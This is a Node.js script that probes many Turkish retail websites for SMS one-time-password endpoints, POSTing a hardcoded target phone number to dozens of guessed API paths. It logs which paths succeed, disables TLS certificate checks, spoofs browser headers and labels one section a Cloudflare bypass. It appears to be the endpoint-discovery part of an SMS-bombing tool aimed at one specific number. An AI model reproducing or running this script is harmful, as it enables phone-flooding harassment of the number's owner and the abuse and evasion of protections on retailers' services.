import axios from 'axios';

process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const STD_HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Content-Type': 'application/json',
  Accept: 'application/json, text/plain, */*',
};

const TARGET_PHONE = '5343622375';

// Her site için alternate URL pattern'leri dene
const DISCOVERY = [
  // CARREFOUR - 405 döndü
  { id: 'carrefour', name: 'Carrefour', base: 'https://www.carrefoursa.com', refPayload: { phone: '5343622375' } },
  // WATSONS - 404
  { id: 'watsons', name: 'Watsons', base: 'https://www.watsons.com.tr', refPayload: { phone: '5343622375' } },
  // GRATIS - 404
  { id: 'gratis', name: 'Gratis', base: 'https://www.gratis.com', refPayload: { phone: '5343622375' } },
  // ROSSMANN - Header overflow
  { id: 'rossmann', name: 'Rossmann', base: 'https://www.rossmann.com.tr', refPayload: { phone: '5343622375', email: 'test@test.com' } },
  // DECATHLON - 403 Cloudflare
  { id: 'decathlon', name: 'Decathlon', base: 'https://www.decathlon.com.tr', refPayload: { phone: '5343622375', email: 'test@test.com' } },
  // ZARA - 404
  { id: 'zara', name: 'Zara', base: 'https://www.zara.com/tr', refPayload: { phone: '+905343622375' } },
  // H&M - 404
  { id: 'hm', name: 'H&M', base: 'https://www2.hm.com/tr_tr', refPayload: { phone: '+905343622375', email: 'test@test.com' } },
  // MANGO - 404
  { id: 'mango', name: 'Mango', base: 'https://shop.mango.com/tr', refPayload: { phone: '+905343622375', countryId: 'TR' } },
  // PENTI - 404
  { id: 'penti', name: 'Penti', base: 'https://www.penti.com', refPayload: { phone: '05343622375', email: 'test@test.com' } },
  // STARBUCKS - 404
  { id: 'starbucks', name: 'Starbucks', base: 'https://www.starbucks.com.tr', refPayload: { mobilePhone: '5343622375' } },
  // MEDIAMARKT - 404
  {
    id: 'mediamarkt',
    name: 'Mediamarkt',
    base: 'https://www.mediamarkt.com.tr',
    refPayload: { phone: '5343622375', email: 'test@test.com' },
  },
  // A101 - 403
  { id: 'a101', name: 'A101', base: 'https://www.a101.com.tr', refPayload: { phone: '05343622375', next: '/a101-kapida' } },
  // HAMIDIYE - 405
  { id: 'hamidiye', name: 'Hamidiye', base: 'https://bayi.hamidiye.istanbul:3400', refPayload: { isGuest: false, phone: '5343622375' } },
];

// Ortak alternatif path'ler
const ALT_PATHS = {
  'send-otp': [
    '/api/v1/auth/register/send-otp',
    '/api/v1/auth/register/sendOtp',
    '/api/v1/auth/send-otp',
    '/api/v1/auth/sendOtp',
    '/api/auth/register/send-otp',
    '/api/auth/register/sendOtp',
    '/api/auth/send-otp',
    '/api/otp/send',
    '/api/v1/otp/send',
    '/rest/V1/auth/register/sendOtp',
    '/rest/V1/auth/sendOtp',
    '/rest/auth/register/sendOtp',
  ],
  'member-sendOtp': [
    '/api/member/register/sendOtp',
    '/api/member/sendOtp',
    '/api/v1/member/sendOtp',
    '/api/v1/member/register/sendOtp',
    '/rest/member/sendOtp',
  ],
  'users-register': ['/users/register/', '/api/users/register/', '/api/v1/users/register/', '/users/auth/register/', '/api/auth/register/'],
};

async function tryAlternateUrls(site, urls, payload, headers = {}) {
  console.log(`\n=== ${site.name} (${site.id}) ===`);
  for (const url of urls) {
    const fullUrl = site.base.replace(/\/+$/, '') + url;
    try {
      const resp = await axios({
        method: 'POST',
        url: fullUrl,
        data: payload,
        headers: { ...STD_HEADERS, ...headers },
        timeout: 8000,
        validateStatus: () => true,
      });
      if (resp.status >= 200 && resp.status < 400) {
        const dataStr = typeof resp.data === 'string' ? resp.data.substring(0, 80) : JSON.stringify(resp.data).substring(0, 80);
        console.log(`  ✅ ${url} → ${resp.status} | ${dataStr}`);
        return { url: fullUrl, status: resp.status };
      } else {
        console.log(`  ❌ ${url} → ${resp.status}`);
      }
    } catch (err) {
      console.log(`  💀 ${url} → ${err.message.substring(0, 60)}`);
    }
  }
  return null;
}

async function main() {
  const results = [];

  // Carrefour - SaaS based, try different API paths
  results.push(
    await tryAlternateUrls(
      DISCOVERY[0],
      [
        '/api/v1/auth/register/send-otp',
        '/api/v1/auth/send-otp',
        '/api/auth/register/send-otp',
        '/api/auth/send-otp',
        '/rest/v1/auth/register/send-otp',
        '/api/otp/send',
        '/api/v1/auth/otp/send',
      ],
      DISCOVERY[0].refPayload,
    ),
  );

  // Watsons - AS Watches, Angular SPA
  results.push(
    await tryAlternateUrls(
      DISCOVERY[1],
      [
        '/api/v1/auth/register/send-otp',
        '/api/v1/auth/send-otp',
        '/api/auth/register/send-otp',
        '/api/otp/send',
        '/rest/V1/auth/register/sendOtp',
        '/rest/V1/auth/sendOtp',
        '/api/v1/customer/sendOtp',
      ],
      DISCOVERY[1].refPayload,
    ),
  );

  // Gratis - Next.js
  results.push(
    await tryAlternateUrls(
      DISCOVERY[2],
      [
        '/api/v1/auth/register/sendOtp',
        '/api/v1/auth/sendOtp',
        '/api/auth/register/sendOtp',
        '/api/auth/sendOtp',
        '/api/otp/send',
        '/api/v1/auth/register/send-otp',
      ],
      DISCOVERY[2].refPayload,
    ),
  );

  // Rossmann - Magento (header overflow fix - reduce headers)
  console.log(`\n=== ${DISCOVERY[3].name} === - trying with minimal headers`);
  for (const url of ['/api/v1/auth/register/send-otp', '/rest/V1/auth/register/sendOtp', '/api/auth/register/send-otp']) {
    try {
      const resp = await axios({
        method: 'POST',
        url: DISCOVERY[3].base.replace(/\/+$/, '') + url,
        data: DISCOVERY[3].refPayload,
        headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json', Accept: 'application/json' },
        timeout: 8000,
        validateStatus: () => true,
      });
      console.log(`  ${resp.status >= 200 && resp.status < 400 ? '✅' : '❌'} ${url} → ${resp.status}`);
    } catch (err) {
      console.log(`  💀 ${url} → ${err.message.substring(0, 60)}`);
    }
  }

  // Zara + Inditex grubu
  console.log(`\n=== INDITEX Grubu (Zara, Bershka, Pull&Bear, Stradivarius, Massimo Dutti) ===`);
  const inditexUrls = [
    '/api/v1/auth/register/send-otp',
    '/api/v1/auth/register/sendOtp',
    '/api/auth/register/sendOtp',
    '/api/auth/register/send-otp',
    '/itxrest/2/auth/register/sendOtp',
    '/api/v2/auth/register/sendOtp',
  ];
  const inditexSites = [
    { base: 'https://www.zara.com/tr', name: 'Zara' },
    { base: 'https://www.bershka.com/tr', name: 'Bershka' },
    { base: 'https://www.pullandbear.com/tr', name: 'Pull&Bear' },
  ];
  for (const site of inditexSites) {
    console.log(`\n--- ${site.name} ---`);
    for (const url of inditexUrls) {
      try {
        const resp = await axios({
          method: 'POST',
          url: site.base + url,
          data: { phone: '+905343622375' },
          headers: STD_HEADERS,
          timeout: 8000,
          validateStatus: () => true,
        });
        console.log(`  ${resp.status >= 200 && resp.status < 400 ? '✅' : '❌'} ${url} → ${resp.status}`);
        if (resp.status >= 200 && resp.status < 400) {
          console.log(`  DATA: ${JSON.stringify(resp.data).substring(0, 100)}`);
        }
      } catch (err) {
        console.log(`  💀 ${url} → ${err.message.substring(0, 60)}`);
      }
    }
  }

  // Samsung Check / Galaxy Store benzeri endpoint'ler
  console.log(`\n=== A101 - Selenium/Cloudflare bypass ===`);
  for (const url of ['/users/otp-login/', '/api/v1/auth/register/send-otp', '/api/auth/send-otp', '/api/otp/send']) {
    try {
      const resp = await axios({
        method: 'POST',
        url: DISCOVERY[12].base + url,
        data: DISCOVERY[12].refPayload,
        headers: { ...STD_HEADERS, 'X-Requested-With': 'XMLHttpRequest' },
        timeout: 8000,
        validateStatus: () => true,
      });
      console.log(`  ${resp.status >= 200 && resp.status < 400 ? '✅' : '❌'} ${url} → ${resp.status}`);
    } catch (err) {
      console.log(`  💀 ${url} → ${err.message.substring(0, 60)}`);
    }
  }

  console.log(`\n═══════════════════════════════════`);
  console.log(`Discovery complete!`);
}

main();
